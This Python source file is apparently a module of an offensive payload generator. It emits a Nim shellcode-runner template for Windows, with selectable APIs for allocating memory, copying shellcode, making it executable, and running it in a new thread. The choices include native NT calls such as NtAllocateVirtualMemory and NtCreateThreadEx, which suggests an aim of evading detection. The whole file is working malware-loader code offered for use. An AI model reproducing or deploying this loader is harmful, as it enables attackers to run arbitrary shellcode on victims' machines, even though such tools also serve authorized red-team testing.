from string import Template
from common.utils.argumentparser import ArgumentParser

class shellcoderunner:
    def __init__(self, arguments):
        parser = ArgumentParser(modulename=self.__class__.__name__)
        parser.add_argument(name='allocate', default='VirtualAlloc', help='Function used for allocating memory', choices={'VirtualAlloc', 'NtAllocateVirtualMemory', 'VirtualAllocEx'})
        parser.add_argument(name='perm', default='rx', help='Protection of memory when shellcode executes', choices={'rx': 'PAGE_EXECUTE_READ', 'rwx':'PAGE_EXECUTE_READWRITE'})
        parser.add_argument(name='copy', default='memcpy', help='Function used for copying memory', choices={'memcpy', 'WriteProcessMemory', 'NtWriteVirtualMemory'})
        parser.add_argument(name='protect', default='VirtualProtect', help='Function used for changing memory protections', choices={'VirtualProtect', 'NtProtectVirtualMemory'})
        parser.add_argument(name='execute', default='CreateThread', help='Function used for executing shellcode', choices={'CreateThread', 'NtCreateThreadEx'})
        parser.add_argument(name='wait', default='WaitForSingleObject', help='Function used for waiting for execution to finish', choices={'WaitForSingleObject', 'NtWaitForSingleObject'})
        self.args = parser.parse_args(arguments)     


    def imports(self) -> list[str]:
        return ['import winim/lean']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:

        template = """
    {transformers}
"""

        if self.args['allocate'] == 'VirtualAlloc':
            template += """
    let address = {VirtualAlloc}(NULL, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
"""
        elif self.args['allocate'] == 'NtAllocateVirtualMemory':
            template += """
    var address: pointer
    var regionSize: uint64 = {shellcodeSize}
    discard {NtAllocateVirtualMemory}(-1, &address, NULL, &regionSize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
"""
        elif self.args['allocate'] == 'VirtualAllocEx':
            template += """
    let address = {VirtualAllocEx}(-1, nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
"""

        if self.args['copy'] == 'memcpy':
            template += """
    copyMem(address, addr(shellcode[0]), {shellcodeSize})
"""
        elif self.args['copy'] == 'NtWriteVirtualMemory':
            template += """
    var numWritten: uint64
    discard {NtWriteVirtualMemory}(-1, address, addr(shellcode[0]), {shellcodeSize}, &numWritten)
"""
        elif self.args['copy'] == 'WriteProcessMemory':
            template += """
    discard {WriteProcessMemory}(-1, address, addr(shellcode[0]), {shellcodeSize}, nil)
"""

        if self.args['protect'] == 'VirtualProtect':
            template += Template("""
    var oldProtect: DWORD
    discard {VirtualProtect}(address, {shellcodeSize}, $perm, &oldProtect)
""").substitute(perm=self.args['perm'])
        elif self.args['protect'] == 'NtProtectVirtualMemory':
            template += Template("""
    var oldProtect: ULONG
    var regSize: uint64 = {shellcodeSize}
    discard {NtProtectVirtualMemory}(-1, &address, &regSize, $perm, &oldProtect)
""").substitute(perm=self.args['perm'])


        if self.args['execute'] == 'CreateThread':
            template += """
    let hThread = {CreateThread}(NULL, 0.SIZE_T, cast[LPTHREAD_START_ROUTINE](address), NULL, 0, NULL)
"""
        elif self.args['execute'] == 'NtCreateThreadEx':
            template += """
    var hThread: HANDLE
    discard {NtCreateThreadEx}(&hThread, 0x001FFFFF, NULL, -1, address, NULL, 0, 0, 0, 0, NULL)
"""

        if self.args['wait'] == 'WaitForSingleObject':
            template += """
    discard {WaitForSingleObject}(hThread, INFINITE)
"""
        elif self.args['wait'] == 'NtWaitForSingleObject':
            template += """
    discard {NtWaitForSingleObject}(hThread, 0, NULL)
"""

        return template